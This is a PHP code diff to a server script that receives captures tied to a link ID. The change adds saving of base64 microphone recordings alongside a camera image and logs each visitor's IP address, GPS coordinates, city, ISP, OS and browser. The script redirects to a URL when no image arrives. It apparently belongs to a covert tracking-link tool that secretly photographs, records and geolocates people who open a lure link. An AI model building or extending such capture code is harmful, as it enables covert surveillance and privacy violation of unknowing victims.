@@ -15,6 +15,7 @@ $os = trim($_POST['os'] ?? '');
 $browser = trim($_POST['browser'] ?? '');
 $lang = trim($_POST['lang'] ?? '');
 $recording_seconds = intval($_POST['recording_seconds'] ?? 0);
+$recording_data = trim($_POST['recording_data'] ?? '');
 
 if (empty($id) || empty($base64_img)) {
     if (!empty($url)) header("Location: " . $url);
@@ -98,14 +99,32 @@ if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $base64_img, $result)) {
     $lang = preg_replace('/[^a-zA-Z0-9\-_,]/', '', $lang);
     $recording_seconds = max(0, min(300, $recording_seconds)); // 0-300秒
     
+    // 🎤 处理录音文件
+    $recording_filename = null;
+    if (!empty($recording_data) && preg_match('/^data:audio\/([\w+]+);base64,/', $recording_data, $audio_m)) {
+        $audio_ext = str_replace(['x-','webm'], ['','webm'], strtolower($audio_m[1]));
+        $allowed_audio = ['webm', 'ogg', 'mp4', 'm4a', 'wav'];
+        if (in_array($audio_ext, $allowed_audio)) {
+            $recording_dir = __DIR__ . '/uploads/recordings/';
+            if (!file_exists($recording_dir)) mkdir($recording_dir, 0755, true);
+            $recording_filename = $id . '_' . date('Ymd_His') . '_' . substr(md5(uniqid(mt_rand(), true)), 0, 8) . '.' . $audio_ext;
+            $audio_data = base64_decode(substr($recording_data, strpos($recording_data, ',') + 1));
+            if (strlen($audio_data) > 10 * 1024 * 1024) { // 限制10MB
+                $recording_filename = null;
+            } else {
+                file_put_contents($recording_dir . $recording_filename, $audio_data);
+            }
+        }
+    }
+    
     try {
         $db = getDB();
         
         $stmt = $db->prepare("UPDATE mir_links SET captures = captures + 1 WHERE link_id = ?");
         $stmt->execute([$id]);
         
-        $stmt = $db->prepare("INSERT INTO mir_photos (link_id, file_path, ip_address, lat, lng, screen_resolution, os, browser, browser_lang, recording_seconds, city, isp, user_agent, file_size) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-        $stmt->execute([$id, $filename, $client_ip, $lat, $lng, $screen, $os, $browser, $lang, $recording_seconds, $city, $isp, mb_substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 500), $file_size]);
+        $stmt = $db->prepare("INSERT INTO mir_photos (link_id, file_path, ip_address, lat, lng, screen_resolution, os, browser, browser_lang, recording_seconds, recording_file_path, city, isp, user_agent, file_size) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+        $stmt->execute([$id, $filename, $client_ip, $lat, $lng, $screen, $os, $browser, $lang, $recording_seconds, $recording_filename, $city, $isp, mb_substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 500), $file_size]);
         
         addLog($id, 'capture');
         
